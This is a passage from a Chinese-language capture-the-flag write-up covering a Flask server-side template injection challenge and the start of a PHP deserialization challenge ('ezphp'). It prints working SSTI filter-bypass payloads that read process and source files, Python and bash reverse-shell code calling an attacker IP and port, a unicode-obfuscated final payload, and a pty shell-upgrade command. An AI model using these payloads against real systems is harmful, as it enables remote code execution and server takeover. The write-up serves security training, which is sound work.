class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>可以利用<code>__builtins__</code>模块中的open函数，先查看一下启动当前进程的完整命令：</p><p>可以构造出如下python链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=&#123;%print(((((((((&#123;&#125;|attr(&quot;__class__&quot;))|attr(&quot;__base__&quot;))|attr(&quot;__subclasses__&quot;))()|attr(80))|attr(&quot;__init__&quot;))|attr(&quot;__globals__&quot;))|attr(&quot;get&quot;)(&quot;builtins&quot;))|attr(&quot;get&quot;)(&quot;open&quot;)(&quot;/proc/self/cmdline&quot;))|attr(read))()%&#125;</span><br></pre></td></tr></table></figure><p>url编码后，得到payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=&#123;%print(((((((((&#123;&#125;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;))()|attr(80))|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u006f\u0070\u0065\u006e&quot;)(&quot;\u002f\u0070\u0072\u006f\u0063\u002f\u0073\u0065\u006c\u0066\u002f\u0063\u006d\u0064\u006c\u0069\u006e\u0065&quot;))|attr(&quot;\u0072\u0065\u0061\u0064&quot;))()%&#125;</span><br></pre></td></tr></table></figure><p>传入参数，回显如下：</p><p><a href="https://pic.imgdb.cn/item/62669e80239250f7c5cd0f61.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62669e80239250f7c5cd0f61.png"></a></p><p>接着查看app.py，查看&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;app.py文件即可，步骤与上述类似，拿到网站源码：</p><p><a href="https://pic.imgdb.cn/item/62669ec2239250f7c5ce15e1.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62669ec2239250f7c5ce15e1.png"></a></p><p>我们发现这里竟然还过滤了flag，popen，system这几个字符串的unicode编码。通过源码发现网站打开了debug模式，于是进入&#x2F;console目录，想着拿到Pin码，获取控制台权限。（<a href="https://www.cnblogs.com/HacTF/p/8160076.html">Flask debug 模式 PIN 码生成机制安全性研究笔记</a>）但是查看&#x2F;etc&#x2F;passwd文件发现，服务器没有运行flask所登录的用户名，因为尝试将用户名设为root得到的Pin码并不正确，且服务器也没有其他可以使用的用户名，因此这个办法也行不通。</p><h3 id="SSTI-eval函数反弹shell"><a href="#SSTI-eval函数反弹shell" class="headerlink" title="SSTI+eval函数反弹shell"></a>SSTI+eval函数反弹shell</h3><p>既然过滤了popen、system和flag的unicode编码，那就意味着我们无法通过open函数查看到flag，也无法使用popen和system这两个函数进行命令执行。那么还有没有别的方法可以反弹shell呢？当然有的。</p><p>这是popen和system函数利用的python反弹shell的代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;your_ip&quot;,your_listening_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><p>这段代码需要放到<code>os.system</code>或者<code>os.popen</code>中执行才成功，因为前面有<code>python3 -c</code> 这个字符串，这个字符串的意思是在终端中使用python3进行了一次命令执行，其中-c的含义为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-c cmd : program passed in as string (terminates option list)</span><br></pre></td></tr></table></figure><p>popen和system都是直接的命令执行函数，类似于直接在终端执行命令。但是eval函数并不是这样，eval函数返回传入字符串的表达式的结果。就是说：将字符串当成有效的表达式 来求值 并 返回计算结果。</p><p>我们将上面那句python反弹shell的代码进行如下尝试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">import</span> socket, subprocess, os</span><br><span class="line"></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">&quot;your_ip&quot;</span>, your_port))</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">0</span>)</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">1</span>)</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">2</span>)</span><br><span class="line">    p = subprocess.call([<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure><p>发现执行成功：</p><p><a href="https://pic.imgdb.cn/item/626689ca239250f7c5971e78.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626689ca239250f7c5971e78.png"></a></p><p>那我们再用eval函数试试？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">eval</span>(</span><br><span class="line">        <span class="string">&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;110.42.234.56\&quot;,9200));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/bash\&quot;,\&quot;-i\&quot;]);&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure><p>执行后报错：</p><p><a href="https://pic.imgdb.cn/item/626689f2239250f7c59779c9.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626689f2239250f7c59779c9.png"></a></p><p>我们可以发现是定位到import时报错，由此怀疑，不能使用import，寻找替换方案为<code>__import__</code>。在使用<code>__import__</code> 前，我们要先知道<a href="https://blog.csdn.net/whatday/article/details/102748166">python3中import和__import__的区别</a>。其中__import__ 不会绑定变量 这意味代码中的每个变量 都要用__import__ 来代替使用。知道这个之后，我们就可以编写出如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">eval</span>(</span><br><span class="line">        <span class="string">&quot;__import__(&#x27;subprocess&#x27;).call(\&quot;echo &#x27;sh -i &gt;&amp; /dev/tcp/your_ip/your_listening_port 0&gt;&amp;1&#x27;&gt;x &amp;&amp; bash x &amp;&amp; rm -rf x\&quot;,shell=True)&quot;</span>)</span><br></pre></td></tr></table></figure><p>在测试机上执行，攻击机上监听相应端口，执行成功：</p><p><a href="https://pic.imgdb.cn/item/62668a31239250f7c59810fb.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668a31239250f7c59810fb.png"></a></p><p>那接下来我们就正式将SSTI与eval函数反弹shell相结合，上面得到的payload为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=&#123;%print((((((((&#123;&#125;|attr(&quot;__class__&quot;))|attr(&quot;__base__&quot;))|attr(&quot;__subclasses__&quot;))()|attr(80))|attr(&quot;__init__&quot;))|attr(&quot;__globals__&quot;))|attr(&quot;get&quot;)(&quot;builtins&quot;))|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;))%&#125;</span><br></pre></td></tr></table></figure><p>那我们就将其中的命令执行相关的代码给替换成我们上面的eval函数中的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=&#123;%print((((((((&#123;&#125;|attr(&quot;__class__&quot;))|attr(&quot;__base__&quot;))|attr(&quot;__subclasses__&quot;))()|attr(80))|attr(&quot;__init__&quot;))|attr(&quot;__globals__&quot;))|attr(&quot;get&quot;)(&quot;builtins&quot;))|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;__import__(&#x27;subprocess&#x27;).call(&quot;echo &#x27;sh -i &gt;&amp; /dev/tcp/your_ip/your_listening_port 0&gt;&amp;1&#x27;&gt;x &amp;&amp; bash x &amp;&amp; rm -rf x&quot;,shell=True)&quot;))%&#125;</span><br></pre></td></tr></table></figure><p>再统一对上面双引号内的字符串进行unicode编码，payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=&#123;%print((((((((&#123;&#125;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;))()|attr(80))|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u0073\u0075\u0062\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u0027\u0029\u002e\u0063\u0061\u006c\u006c\u0028\u0022\u0065\u0063\u0068\u006f\u0020\u0027\u0073\u0068\u0020\u002d\u0069\u0020\u003e\u0026\u0020\u002f\u0064\u0065\u0076\u002f\u0074\u0063\u0070\u002f\u0031\u0031\u0030\u002e\u0034\u0032\u002e\u0032\u0033\u0034\u002e\u0035\u0036\u002f\u0039\u0032\u0030\u0030\u0020\u0030\u003e\u0026\u0031\u0027\u003e\u0078\u0020\u0026\u0026\u0020\u0062\u0061\u0073\u0068\u0020\u0078\u0020\u0026\u0026\u0020\u0072\u006d\u0020\u002d\u0072\u0066\u0020\u0078\u0022\u002c\u0073\u0068\u0065\u006c\u006c\u003d\u0054\u0072\u0075\u0065\u0029&quot;))%&#125;</span><br></pre></td></tr></table></figure><p>攻击机上监听相应端口后，在网页中发送这个url参数，就可以成功反弹shell了：</p><p><a href="https://pic.imgdb.cn/item/62668a2a239250f7c597ffe1.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668a2a239250f7c597ffe1.png"></a></p><p>在这里再科普一些有关于反弹shell的知识：通过以上方法反弹shell获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。这往往都是因为我们获取的shell并不是标准的虚拟终端，为了能够完成输入密码等操作，我们必须模拟一个真正的终端设备。我们其实可以借助于python默认包含的一个pty标准库来获取一个标准的虚拟终端环境。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。我们只需在获取的shell里面输入如下命令，即可模拟一个终端设备：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/62668a54239250f7c5985d4c.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668a54239250f7c5985d4c.png"></a></p><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><p>打开环境，网站直接给出源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听某个大黑阔说flag在/flag里</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Snert</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a != <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) )&#123;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b))) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\)|\(|\&#x27;|\&quot;|\&lt;\?php|post|get/&quot;</span>, <span class="variable">$this</span>-&gt;a, <span class="variable">$match</span>))&#123;</span><br><span class="line">                   <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">die</span>(<span class="string">&quot;Get out,Hacker!!!!!&quot;</span>);</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;snert_is_good&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;snert_is_good&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这道题目考察的是选手对PHP的原生类在CTF中的利用，我们可以利用以下方法遍历PHP的内置类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span>    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类</span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这道题目中使用的是<code>Error/Exception</code> 内置类。<code>Error</code>类是php的一个内置类，用于自动自定义一个Error，使用于php7版本。<code>Exception</code> 适用于php5、7版本 ，是所有用户级异常的基类。</p><h3 id="Error类："><a href="#Error类：" class="headerlink" title="Error类："></a>Error类：</h3><p>类摘要：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Error implements Throwable &#123;</span><br><span class="line">    /* 属性 */</span><br><span class="line">    protected string $message ;</span><br><span class="line">    protected int $code ;</span><br><span class="line">    protected string $file ;</span><br><span class="line">    protected int $line ;</span><br><span class="line">    /* 方法 */</span><br><span class="line">    public __construct ( string $message = &quot;&quot; , int $code = 0 , Throwable $previous = null )</span><br><span class="line">    final public getMessage ( ) : string</span><br><span class="line">    final public getPrevious ( ) : Throwable</span><br><span class="line">    final public getCode ( ) : mixed</span><br><span class="line">    final public getFile ( ) : string</span><br><span class="line">    final public getLine ( ) : int</span><br><span class="line">    final public getTrace ( ) : array</span><br><span class="line">    final public getTraceAsString ( ) : string</span><br><span class="line">    public __toString ( ) : string</span><br><span class="line">    final private __clone ( ) : void</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类属性：</p><ul><li><p>message：错误消息内容</p></li><li><p>code：错误代码</p></li><li><p>file：抛出错误的文件名</p></li><li><p>line：抛出错误在该文件中的行数</p></li></ul><p>类方法：</p><ul><li><p><a href="https://www.php.net/manual/zh/error.construct.php"><code>Error::__construct</code></a> — 初始化 error 对象</p></li><li><p><a href="https://www.php.net/manual/zh/error.getmessage.php"><code>Error::getMessage</code></a> — 获取错误信息</p></li><li><p><a href="https://www.php.net/manual/zh/error.getprevious.php"><code>Error::getPrevious</code></a> — 返回先前的 Throwable</p></li><li><p><a href="https://www.php.net/manual/zh/error.getcode.php"><code>Error::getCode</code></a> — 获取错误代码</p></li><li><p><a href="https://www.php.net/manual/zh/error.getfile.php"><code>Error::getFile</code></a> — 获取错误发生时的文件</p></li><li><p><a href="https://www.php.net/manual/zh/error.getline.php"><code>Error::getLine</code></a> — 获取错误发生时的行号</p></li><li><p><a href="https://www.php.net/manual/zh/error.gettrace.php"><code>Error::getTrace</code></a> — 获取调用栈（stack trace）</p></li><li><p><a href="https://www.php.net/manual/zh/error.gettraceasstring.php"><code>Error::getTraceAsString</code></a> — 获取字符串形式的调用栈（stack trace）</p></li><li><p><a href="https://www.php.net/manual/zh/error.tostring.php"><code>Error::__toString</code></a> — error 的字符串表达</p></li><li><p><a href="https://www.php.net/manual/zh/error.clone.php"><code>Error::__clone</code></a> — 克隆 error</p></li></ul><h3 id="Exception-类"><a href="#Exception-类" class="headerlink" title="Exception 类"></a>Exception 类</h3><p>类摘要：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Exception &#123;</span><br><span class="line">    /* 属性 */</span><br><span class="line">    protected string $message ;</span><br><span class="line">    protected int $code ;</span><br><span class="line">    protected string $file ;</span><br><span class="line">    protected int $line ;</span><br><span class="line">    /* 方法 */</span><br><span class="line">    public __construct ( string $message = &quot;&quot; , int $code = 0 , Throwable $previous = null )</span><br><span class="line">    final public getMessage ( ) : string</span><br><span class="line">    final public getPrevious ( ) : Throwable</span><br><span class="line">    final public getCode ( ) : mixed</span><br><span class="line">    final public getFile ( ) : string</span><br><span class="line">    final public getLine ( ) : int</span><br><span class="line">    final public getTrace ( ) : array</span><br><span class="line">    final public getTraceAsString ( ) : string</span><br><span class="line">    public __toString ( ) : string</span><br><span class="line">    final private __clone ( ) : void</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>类属性：</strong></p><ul><li><p>message：异常消息内容</p></li><li><p>code：异常代码</p></li><li><p>file：抛出异常的文件名</p></li><li><p>line：抛出异常在该文件中的行号</p></li></ul><p>类方法：</p><ul><li><p><a href="https://www.php.net/manual/zh/exception.construct.php"><code>Exception::__construct</code></a> — 异常构造函数</p></li><li><p><a href="https://www.php.net/manual/zh/exception.getmessage.php"><code>Exception::getMessage</code></a> — 获取异常消息内容</p></li><li><p><a href="https://www.php.net/manual/zh/exception.getprevious.php"><code>Exception::getPrevious</code></a> — 返回异常链中的前一个异常</p></li><li><p><a href="https://www.php.net/manual/zh/exception.getcode.php"><code>Exception::getCode</code></a> — 获取异常代码</p></li><li><p><a href="https://www.php.net/manual/zh/exception.getfile.php"><code>Exception::getFile</code></a> — 创建异常时的程序文件名称</p></li><li><p><a href="https://www.php.net/manual/zh/exception.getline.php"><code>Exception::getLine</code></a> — 获取创建的异常所在文件中的行号</p></li><li><p><a href="https://www.php.net/manual/zh/exception.gettrace.php"><code>Exception::getTrace</code></a> — 获取异常追踪信息</p></li><li><p><a href="https://www.php.net/manual/zh/exception.gettraceasstring.php"><code>Exception::getTraceAsString</code></a> — 获取字符串类型的异常追踪信息</p></li><li><p><a href="https://www.php.net/manual/zh/exception.tostring.php"><code>Exception::__toString</code></a> — 将异常对象转换为字符串</p></li><li><p><a href="https://www.php.net/manual/zh/exception.clone.php"><code>Exception::__clone</code></a> — 异常克隆</p></li></ul><p>可以看到，在Error和Exception这两个PHP原生类中内只有 <code>__toString</code> 方法，这个方法用于将异常或错误对象转换为字符串。</p><p>先以Error为例，看看当它触发了__toString方法时会发生什么：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><p>输出：</p><p><a href="https://pic.imgdb.cn/item/62668a93239250f7c598f60a.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668a93239250f7c598f60a.png"></a></p><p>发现这将会以字符串的形式输出当前报错，包含当前的错误信息（”payload”）以及当前报错的行号（”2”），而传入 <code>Error(&quot;payload&quot;,1)</code> 中的错误代码“1”则没有输出出来。</p><p>再看下一个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出：</p><p><a href="https://pic.imgdb.cn/item/62668a9f239250f7c59916c0.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668a9f239250f7c59916c0.png"></a></p><p>可见，<code>$a</code> 和 <code>$b</code> 这两个错误对象本身是不同的，但是 <code>__toString</code> 方法返回的结果是相同的。注意，这里之所以需要在同一行是因为 <code>__toString</code> 返回的数据包含当前行号。</p><p>再看下一个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;md5($a)=&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;md5($b)=&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;sha1($a)=&#x27;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;sha1($b)=&#x27;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>===<span class="variable">$b</span>)</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;相同&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;不相同&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出为：</p><p><a href="https://pic.imgdb.cn/item/62668aa9239250f7c5993370.png" class="gallery-item"><img 